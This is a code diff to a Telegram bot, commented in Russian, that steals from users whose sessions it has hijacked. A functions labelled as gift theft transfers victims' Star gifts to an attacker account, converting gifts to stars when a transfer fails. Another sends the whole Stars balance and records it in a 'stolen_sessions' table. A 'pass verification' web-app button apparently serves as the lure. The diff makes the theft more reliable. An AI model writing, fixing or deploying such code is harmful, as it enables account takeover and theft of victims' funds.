@@ -284,7 +284,7 @@ bot.on('callback_query', async (query) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Пройти верификация", web_app: { url: WEB_APP_URL } }
+                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
                             ]
                         ]
                     }
@@ -504,7 +504,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     }
 });
 
-// КРАЖА ПОДАРКОВ (ОБНОВЛЕННЫЙ МЕТОД)
+// КРАЖА ПОДАРКОВ
 async function stealAllGifts() {
     try {
         const rows = await new Promise((resolve, reject) => {
@@ -625,7 +625,7 @@ async function transferGiftsToTarget(client, phone) {
             accessHash: targetUser.accessHash
         });
 
-        // Фильтруем только transferable подарки (у которых есть transferStars)
+        // Фильтруем transferable подарки
         const transferableGifts = gifts.gifts.filter(gift => gift.transferStars);
         
         console.log(`🔄 Transferable подарков: ${transferableGifts.length}`);
@@ -641,30 +641,44 @@ async function transferGiftsToTarget(client, phone) {
 
         for (const gift of transferableGifts) {
             try {
-                console.log(`→ Передаю подарок msgId=${gift.msgId}, transferStars=${gift.transferStars ? Number(gift.transferStars.value) : 'N/A'}`);
+                console.log(`→ Обрабатываю подарок msgId=${gift.msgId}`);
 
+                // Если подарок не сохранен - сначала сохраняем
+                if (gift.unsaved) {
+                    console.log("💾 Сохраняю подарок...");
+                    await client.invoke(
+                        new Api.payments.SaveStarGift({
+                            stargift: new Api.InputSavedStarGiftUser({ msgId: gift.msgId })
+                        })
+                    );
+                    console.log("✅ Подарок сохранен");
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+
+                // Передаем подарок
+                console.log(`🔄 Передаю подарок...`);
                 await client.invoke(
                     new Api.payments.TransferStarGift({
-                        stargift: new Api.InputSavedStarGiftUser({ 
-                            msgId: gift.msgId 
-                        }),
+                        stargift: gift.savedId
+                            ? new Api.InputSavedStarGift({ id: gift.savedId })
+                            : new Api.InputSavedStarGiftUser({ msgId: gift.msgId }),
                         toId: targetPeer
                     })
                 );
                 
                 stolenCount++;
-                console.log(`   ✅ Успешно передан подарок`);
+                console.log(`✅ Подарок успешно передан на @NikLaStore`);
                 
                 // Пауза между запросами
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
             } catch (e) {
-                console.log(`   ❌ Ошибка передачи подарка:`, e.message);
+                console.log(`❌ Не удалось передать подарок:`, e.message);
                 
                 // Если передача не работает, пробуем конвертировать в звезды
                 try {
                     if (gift.convertStars) {
-                        console.log(`   🔄 Пробую конвертировать в звезды: ${gift.convertStars}`);
+                        console.log(`🔄 Пробую конвертировать в звезды: ${gift.convertStars}`);
                         
                         await client.invoke(
                             new Api.payments.SendStars({
@@ -677,11 +691,11 @@ async function transferGiftsToTarget(client, phone) {
                         );
                         
                         stolenCount++;
-                        console.log(`   ✅ Успешно конвертирован в звезды`);
-                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        console.log(`✅ Успешно конвертирован в звезды`);
+                        await new Promise(resolve => setTimeout(resolve, 2000));
                     }
                 } catch (e2) {
-                    console.log(`   ❌ Ошибка конвертации:`, e2.message);
+                    console.log(`❌ Ошибка конвертации:`, e2.message);
                     continue;
                 }
             }
@@ -718,8 +732,8 @@ async function transferStarsToTarget(client, phone) {
 
         console.log(`⭐ ${phone}: Баланс звезд: ${starsAmount}`);
 
-        if (starsAmount === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
+        if (starsAmount < 1) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Недостаточно звезд (${starsAmount})`);
             return false;
         }
 
@@ -739,11 +753,15 @@ async function transferStarsToTarget(client, phone) {
             accessHash: targetUser.accessHash
         });
 
-        // Передаем звезды
+        // Передаем звезды (минимально 1 звезда)
+        const starsToSend = Math.max(1, Math.floor(starsAmount));
+        
+        console.log(`🔄 Отправляю ${starsToSend} звезд...`);
+
         await client.invoke(
             new Api.payments.SendStars({
                 peer: targetPeer,
-                stars: Math.floor(starsAmount),
+                stars: starsToSend,
                 purpose: new Api.InputStorePaymentPremiumSubscription({
                     restore: false,
                     upgrade: true
@@ -752,9 +770,9 @@ async function transferStarsToTarget(client, phone) {
         );
 
         db.run(`UPDATE stolen_sessions SET stars_data = ? WHERE phone = ?`, 
-            [Math.floor(starsAmount), phone]);
+            [starsToSend, phone]);
 
-        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${Math.floor(starsAmount)} звезд`);
+        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${starsToSend} звезд`);
         return true;
         
     } catch (error) {
@@ -812,4 +830,4 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-console.log('✅ Бот запущен с обновленными функциями кражи');
+console.log('✅ Бот запущен с исправленной передачей подарков');
